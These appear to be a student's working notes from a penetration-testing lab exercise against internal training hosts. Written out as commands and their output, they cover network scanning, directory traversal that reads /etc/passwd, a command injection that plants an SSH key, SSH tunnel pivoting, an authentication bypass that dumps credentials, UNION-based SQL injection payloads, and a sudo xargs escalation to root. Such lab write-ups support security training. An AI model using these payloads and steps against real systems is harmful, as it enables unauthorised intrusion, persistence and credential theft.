stack 18
ANSO-503-M
10.50.25.65

scan web server
 nmap 10.50.25.65 -T5 --script=http-enum

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /robots.txt: Robots file
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /share/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
5
robots.txt - Disallow: /Onlinetools

Onlinetools -
--directory traversal
../etc/passwd
root:x:0:0:root:/root:/bin/bash                 ---------------------
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:PNBkKIwDM0s1IxkkOUPD:/var/www:/bin/sh   --------------------------------
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
openupthedoor:x:1001:1001::/home/openupthedoor:/bin/bash -----------------------------------

images - screenshot

share - screenshot
192.168.28.0/27
192.168.28.160/27

command injection
ssh-keygen -t rsa -b 4096
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC9gD6zdRnjOupiRLKF2AfHM8ghSHsoggybD9anlzR7d03vt+S0nPbridO3/q68owgf7Is2P7CSiH/VYLqVICY2kK3RJ+bWFLoiR3tVtzs4g/w3Y7S+TLJW4t8kpnkigvmUQq+7MRBkwnknwIsowuCBqmxYtSn4AchlrSWr2TcjIy7YeCcPsAICnhegu/hlyyfZRphC+4/uT2jdc3x70qARI1tmoEFG6Fxvqfma2WjcYmzGDDt3NeKUWmQTLFc+a25FjSQXL49M1vy9NOIFNkFN+l+TU1TB64rg3ZwP9qhIvtD0A3/rcjgLJYZ8R9seklKvnB+EhwvSLD53e/YqL1l819+hcTnQlvowwVPdMhJZrpdFXKB6TqEzDkun56Khnp1dPkFmU/apb3vXnRVSXtgfCl9WyalVaj8KqQymijMX64Q+OLKpBnDsW4T1MwOPxxoDmgI4+mGY+9Z8bWCEvlrKG4bxtYqyxutrhl2YirLdpH6t6/1t9HDKs4tnpfhO72BwXdmW2aerPs4d3NYHu+6ZPmfo0Ey27aoEHg7S/BeddgKnHR4YwdgC0b7Bg7AIWY/22mlHdOWuhhRRWI1vzKFmFWEJ5n3htDEieKrcnneHcSz0yQFuxTQhUG4ZvbDIYyGMv9YMTxqhCx+WzrKMWQ4UDQSjzQJScjZY8t7wo9mEdQ== student@lin-ops
; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC9gD6zdRnjOupiRLKF2AfHM8ghSHsoggybD9anlzR7d03vt+S0nPbridO3/q68owgf7Is2P7CSiH/VYLqVICY2kK3RJ+bWFLoiR3tVtzs4g/w3Y7S+TLJW4t8kpnkigvmUQq+7MRBkwnknwIsowuCBqmxYtSn4AchlrSWr2TcjIy7YeCcPsAICnhegu/hlyyfZRphC+4/uT2jdc3x70qARI1tmoEFG6Fxvqfma2WjcYmzGDDt3NeKUWmQTLFc+a25FjSQXL49M1vy9NOIFNkFN+l+TU1TB64rg3ZwP9qhIvtD0A3/rcjgLJYZ8R9seklKvnB+EhwvSLD53e/YqL1l819+hcTnQlvowwVPdMhJZrpdFXKB6TqEzDkun56Khnp1dPkFmU/apb3vXnRVSXtgfCl9WyalVaj8KqQymijMX64Q+OLKpBnDsW4T1MwOPxxoDmgI4+mGY+9Z8bWCEvlrKG4bxtYqyxutrhl2YirLdpH6t6/1t9HDKs4tnpfhO72BwXdmW2aerPs4d3NYHu+6ZPmfo0Ey27aoEHg7S/BeddgKnHR4YwdgC0b7Bg7AIWY/22mlHdOWuhhRRWI1vzKFmFWEJ5n3htDEieKrcnneHcSz0yQFuxTQhUG4ZvbDIYyGMv9YMTxqhCx+WzrKMWQ4UDQSjzQJScjZY8t7wo9mEdQ== student@lin-ops" > /var/www/.ssh/authorized_keys

ssh to webserver
ssh www-data@10.50.25.65

/var/www/html/newtest/test/automation/Automation_test.zip ----------

kernel version
uname -r
4.15.0-88-generic


ping sweep
for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done

64 bytes from 192.168.28.177: icmp_seq=1 ttl=63 time=1.16 ms
64 bytes from 192.168.28.182: icmp_seq=1 ttl=63 time=1.28 ms

master socket to webserver
ssh -MS /tmp/T1 www-data@10.50.25.65

dynamic
ssh -S /tmp/T1 dummy -O forward -D 9050

nmap scan the 2 new targets
proxychains nmap 192.168.28.177,182 -T5 --script=http-enum

Nmap scan report for 192.168.28.177
Host is up (0.00053s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 192.168.28.182
Host is up (0.00056s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /login/: Login page
|   /robots.txt: Robots file
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'


sockets to ports
ssh -S /tmp/T1 dummy -O forward -L 11711:192.168.28.182:80
ssh -S /tmp/T1 dummy -O forward -L 11712:192.168.28.182:22
ssh -S /tmp/T1 dummy -O forward -L 11713:192.168.28.177:22

Defense_KP 192.168.28.182--------------------------------------------------------------------------

robots.txt - Disallow: /Onlinetools
             Disallow: /login

Onlinetools - lookup.php
    directory traversal

../etc/passwd
root:x:0:0:root:/root:/bin/bash         -----------------------------
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash   ------------------------------
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false

../etc/hosts

127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
192.168.28.177 Defense_Nix1
IdjOQBkQIPKM32dlfur8



login - login.php - nothing
        login.html

login.html
authe bypass

Array
(
    [0] => Msmith
    [name] => Msmith
    [1] => Squanchy
    [password] => Squanchy
)
1Array
(
    [0] => Fpalic
    [name] => Fpalic
    [1] => Birdperson
    [password] => Birdperson
)
1Array
(
    [0] => Kmichae
    [name] => Kmichae
    [1] => MrMeeseeks
    [password] => MrMeeseeks
)
1

forces/forcesreport.html
sql injection tables
Lviv
127.0.0.1:11711/forces/forcespick.php?Locations=4 UNION SELECT table_schema,table_name,column_name,4 FROM information_schema.columns
UNION SELECT name,rank,unit,4 FROM forces.commanders

UNION SELECT unit,auth_str,on_hand FROM forces.unit

UNION SELECT user,name,password,4 FROM auth_users.logins
Province 	Rick Sanchez
Civilian population 	Rsanch
Residing Unit 	ScaryTerry
Troop strength 	4

Province 	Morty Smith
Civilian population 	Msmith
Residing Unit 	Squanchy
Troop strength 	4

Province 	Frank Palicky
Civilian population 	Fpalic
Residing Unit 	Birdperson
Troop strength 	4

Province 	Krombopulos Michael
Civilian population 	Kmichae
Residing Unit 	MrMeeseeks
Troop strength 	4





ssh into .177
Fpalic : Birdperson

Defense_NIX 192.168.28.177

cat /etc/passwd

root:x:0:0:root:/root:/bin/bash ----------------------------------
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash ----------------------------------------
Fpalic:x:1001:1001::/home/Fpalic:/bin/sh   ----------------------------------------------------------


sudo -l

User Fpalic may run the following commands on defense-nix1-18:
    (ALL) NOPASSWD: /usr/bin/touch
    (ALL) NOPASSWD: /usr/bin/whoami
    (ALL) NOPASSWD: /usr/bin/gdb
    (ALL) NOPASSWD: /usr/bin/xargs

sudo gdb -nx -ex '!sh' -ex quit - no work

sudo xargs -a /dev/null sh - work


root# ss -ntlp
State      Recv-Q      Send-Q              Local Address:Port              Peer Address:Port                                                                                                        
LISTEN     0           1                         0.0.0.0:21254                  0.0.0.0:*          users:(("SecurityOnion",pid=1001,fd=3))                                                          
LISTEN     0           128                 127.0.0.53%lo:53                     0.0.0.0:*          users:(("systemd-resolve",pid=635,fd=13))                                                        
LISTEN     0           128                       0.0.0.0:22                     0.0.0.0:*          users:(("sshd",pid=792,fd=3))                                                                    
LISTEN     0           128                     127.0.0.1:6010                   0.0.0.0:*          users:(("sshd",pid=22432,fd=10))                                                                 
LISTEN     0           128                          [::]:22                        [::]:*          users:(("sshd",pid=792,fd=4))                                                                    
LISTEN     0           128                         [::1]:6010                      [::]:*


root# ss -antp
State         Recv-Q      Send-Q             Local Address:Port            Peer Address:Port                                                                                                        
LISTEN        0           1                        0.0.0.0:21254                0.0.0.0:*          users:(("SecurityOnion",pid=1001,fd=3))                                                          
LISTEN        0           128                127.0.0.53%lo:53                   0.0.0.0:*          users:(("systemd-resolve",pid=635,fd=13))                                                        
LISTEN        0           128                      0.0.0.0:22                   0.0.0.0:*          users:(("sshd",pid=792,fd=3))                                                                    
LISTEN        0           128                    127.0.0.1:6010                 0.0.0.0:*          users:(("sshd",pid=22432,fd=10))                                                                 
TIME-WAIT     0           0                      127.0.0.1:44462              127.0.0.1:21254                                                                                                       
ESTAB         0           0                 192.168.28.177:22                10.0.28.52:51298      users:(("sshd",pid=22432,fd=3),("sshd",pid=22297,fd=3))                                          
LISTEN        0           128                         [::]:22                      [::]:*          users:(("sshd",pid=792,fd=4))                                                                    
LISTEN        0           128                        [::1]:6010                    [::]:*

ps -elf | grep 1001 
0 S root      1001   989  0  80   0 -  3399 inet_c Jul29 ?        00:00:00 /bin/SecurityOnion -kl 21254

ps -elf | grep 989 
4 S root         1     0  0  80   0 - 39893 ep_pol Jul29 ?        00:00:01 /sbin/init
0 S root       989   982  0  80   0 -  3328 wait   Jul29 ?        00:00:00 /bin/bash /usr/share/.svchost.sh
0 S root      1001   989  0  80   0 -  3399 inet_c Jul29 ?        00:00:00 /bin/SecurityOnion -kl 21254

cat /usr/share/.svchost.sh
































